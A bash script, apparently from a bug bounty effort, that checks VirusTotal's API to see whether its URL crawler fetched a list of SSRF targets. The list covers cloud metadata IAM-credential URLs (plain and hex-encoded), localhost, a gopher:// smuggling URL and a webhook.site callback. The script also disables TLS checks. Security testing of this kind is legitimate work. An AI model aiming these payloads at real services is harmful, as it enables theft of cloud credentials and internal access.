#!/usr/bin/env bash
# VirusTotal — SSRF verdict: check URL crawler data (phase 2 of VT scan)
# The /api/v3/urls/{id} object holds what VT's own crawler fetched:
#   last_http_response_code, last_http_response_headers, redirection_chain, last_final_url
# If VT's crawler reached 169.254.169.254 → SSRF confirmed
# Run: VT_API_KEY=<key> bash scripts/vt-ssrf-verdict.sh 2>&1 | tee ~/vt-ssrf-verdict.txt

set -euo pipefail
: "${VT_API_KEY:?Set VT_API_KEY}"
UA="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/125.0 Safari/537.36"
BASE="https://www.virustotal.com/api/v3"
OUT="$HOME/bug-bounty-hunting-/results/virustotal.com/evidence"
mkdir -p "$OUT"

c() { curl -sk --connect-timeout 12 -A "$UA" -H "x-apikey: ${VT_API_KEY}" "$@"; }

b64url() {
  python3 -c "import base64,sys; print(base64.urlsafe_b64encode(sys.argv[1].encode()).decode().rstrip('='))" "$1"
}

extract_crawler() {
  local url="$1"
  local b64; b64=$(b64url "$url")
  echo ""
  echo "════════════════════════════════════════"
  echo "URL: ${url}"

  OBJ=$(c "${BASE}/urls/${b64}")
  if echo "$OBJ" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('error',{}).get('code',''))" 2>/dev/null | grep -q "NotFoundError"; then
    echo "  → Not in VT database yet (crawler hasn't run)"
    return
  fi

  # Extract the crawler fields
  python3 -c "
import sys, json
raw = '''$(echo "$OBJ" | sed "s/'/\\\'/g")'''
try:
    d = json.load(sys.stdin)
    attrs = d.get('data', {}).get('attributes', {})
    crawler_fields = [
        'last_http_response_code',
        'last_http_response_content_length',
        'last_http_response_content_sha256',
        'last_final_url',
        'redirection_chain',
        'last_http_response_headers',
        'title',
        'last_analysis_date',
        'times_submitted',
        'total_votes',
    ]
    found_any = False
    for f in crawler_fields:
        val = attrs.get(f)
        if val is not None:
            found_any = True
            if isinstance(val, dict):
                print(f'  {f}: {json.dumps(val)[:120]}')
            elif isinstance(val, list):
                print(f'  {f}: {val[:5]}')
            else:
                print(f'  {f}: {val}')
    if not found_any:
        print('  [no crawler fields found — crawler may not have run yet]')
except Exception as e:
    print(f'  parse error: {e}')
" <<< "$OBJ"
}

echo "══════════════════════════════════════════════════"
echo "VT Crawler Data — did VT fetch these SSRF targets?"
echo "══════════════════════════════════════════════════"

# Test all SSRF targets from H1/H2
TARGETS=(
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  "http://169.254.169.254/latest/meta-data/"
  "http://0xa9fea9fe/latest/meta-data/"
  "http://127.0.0.1/"
  "http://0.0.0.0/"
  "http://[fe80::1]/admin"
  "gopher://127.0.0.1:80/_GET / HTTP/1.0"
  "ftp://169.254.169.254/latest/meta-data/"
  "https://webhook.site/7cfcd190-756e-4e7e-b13e-b5102fe8c2d2/vt-direct"
)

for url in "${TARGETS[@]}"; do
  extract_crawler "$url"
done

echo ""
echo "══════════════════════════════════════════════════"
echo "Key: last_http_response_code present = crawler fetched the URL"
echo "     redirection_chain non-empty = VT followed redirects"
echo "     Both present on 169.254.169.254 = SSRF CONFIRMED"
echo "══════════════════════════════════════════════════"

echo ""
echo "=== Checking webhook.site URL object ==="
extract_crawler "https://webhook.site/7cfcd190-756e-4e7e-b13e-b5102fe8c2d2"

echo ""
echo "=== Full raw URL object for 169.254.169.254 ==="
IMDS_B64=$(b64url "http://169.254.169.254/latest/meta-data/iam/security-credentials/")
c "${BASE}/urls/${IMDS_B64}" | python3 -m json.tool 2>/dev/null \
  | tee "$OUT/url-object-imds.json" | head -60

echo ""
echo "=== Full raw URL object for webhook.site ==="
WEBHOOK_B64=$(b64url "https://webhook.site/7cfcd190-756e-4e7e-b13e-b5102fe8c2d2")
c "${BASE}/urls/${WEBHOOK_B64}" | python3 -m json.tool 2>/dev/null \
  | tee "$OUT/url-object-webhook.json" | head -60
